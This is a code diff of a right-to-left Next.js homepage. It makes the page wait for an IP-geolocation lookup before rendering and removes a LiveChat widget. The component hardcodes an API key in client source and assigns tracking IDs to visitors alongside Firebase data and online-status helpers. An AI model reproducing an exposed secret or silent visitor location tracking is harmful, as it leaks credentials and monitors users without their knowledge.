@@ -18,10 +18,11 @@ import {
 } from "lucide-react";
 import HeroCarousel from "@/components/hero-carousel";
 import Link from "next/link";
-import { useEffect } from "react";
+import { useEffect, useState } from "react";
 import { addData } from "@/lib/firebase";
 import { setupOnlineStatus } from "@/lib/utils";
 import { LiveChatWidget } from "@livechat/widget-react";
+import Loader from "@/components/loader";
 
 function randstr(prefix: string) {
   return Math.random()
@@ -30,8 +31,11 @@ function randstr(prefix: string) {
 }
 const visitorID = randstr("bbb-");
 export default function CFCHomePage() {
+  const [done, setDone] = useState(false);
   useEffect(() => {
-    getLocation();
+    getLocation().then(() => {
+      setDone(true);
+    });
   }, []);
   async function getLocation() {
     const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef";
@@ -55,7 +59,7 @@ export default function CFCHomePage() {
       console.error("Error fetching location:", error);
     }
   }
-  return (
+  return done ? (
     <div className="min-h-screen bg-gray-50" dir="rtl">
       {/* Header */}
       <header className="bg-gradient-to-r from-blue-600 to-blue-700 text-white p-4 shadow-lg">
@@ -361,7 +365,8 @@ export default function CFCHomePage() {
           </p>
         </div>
       </footer>
-      <LiveChatWidget license="19286514" />
     </div>
+  ) : (
+    <Loader />
   );
 }
